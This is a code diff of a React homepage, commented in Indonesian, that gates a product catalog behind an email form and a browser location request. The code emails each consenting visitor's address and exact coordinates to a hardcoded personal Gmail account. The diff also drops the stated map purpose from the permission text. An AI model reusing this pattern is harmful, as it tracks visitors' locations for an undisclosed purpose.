@@ -17,7 +17,6 @@ export default function HomePage() {
   const [visitorEmail, setVisitorEmail] = useState('');
   const [step, setStep] = useState<Step>('email');
 
-  // Toast hilang 3 detik
   useEffect(() => {
     if (toast) {
       const t = setTimeout(() => setToast(null), 3000);
@@ -25,7 +24,7 @@ export default function HomePage() {
     }
   }, [toast]);
 
-  // Ambil lokasi
+  // 🔥 Ambil lokasi (dengan popup browser)
   const getLocation = (): Promise<{ lat: number; lng: number } | null> => {
     return new Promise((resolve) => {
       if (!navigator.geolocation) {
@@ -40,7 +39,6 @@ export default function HomePage() {
     });
   };
 
-  // Kirim notifikasi (setelah email & lokasi didapat)
   const sendNotification = async (loc: { lat: number; lng: number } | null) => {
     try {
       await sendVisitNotification('walanton2@gmail.com', {
@@ -59,7 +57,7 @@ export default function HomePage() {
     }
   };
 
-  // Handle submit email
+  // 🔥 Handle submit email — panggil geolocation langsung
   const handleEmailSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!visitorEmail.trim()) {
@@ -67,23 +65,27 @@ export default function HomePage() {
       return;
     }
 
+    // Pindah ke step location (tampilkan loading)
     setStep('location');
     setToast('📍 Meminta izin lokasi...');
 
+    // 🔥 Panggil geolocation (popup browser akan muncul)
     const loc = await getLocation();
 
     if (!loc) {
+      // User menolak atau error → denied
       setStep('denied');
       setToast(null);
       return;
     }
 
+    // Lokasi diizinkan → kirim notifikasi & buka katalog
     await sendNotification(loc);
     setStep('catalog');
     setToast('✅ Notifikasi terkirim!');
   };
 
-  // Ambil data produk (hanya jika step catalog)
+  // Load produk hanya jika step catalog
   useEffect(() => {
     if (step !== 'catalog') return;
     const load = async () => {
@@ -114,7 +116,6 @@ export default function HomePage() {
 
   // ========== RENDER ==========
 
-  // 1. Popup email
   if (step === 'email') {
     return (
       <>
@@ -183,7 +184,6 @@ export default function HomePage() {
     );
   }
 
-  // 2. Popup location
   if (step === 'location') {
     return (
       <>
@@ -211,7 +211,7 @@ export default function HomePage() {
           }}>
             <h3>📍 Meminta Izin Lokasi</h3>
             <p style={{ fontSize: '0.9rem', color: '#6b7280', marginBottom: '1rem' }}>
-              Kami membutuhkan lokasi akurat Anda untuk maps.
+              Kami membutuhkan lokasi akurat Anda.
               <br />
               <small>Izin akan diminta oleh browser.</small>
             </p>
@@ -234,7 +234,6 @@ export default function HomePage() {
     );
   }
 
-  // 3. Denied (lokasi ditolak)
   if (step === 'denied') {
     return (
       <>
@@ -285,7 +284,7 @@ export default function HomePage() {
     );
   }
 
-  // 4. Catalog (step === 'catalog')
+  // Catalog
   if (loading) {
     return (
       <>
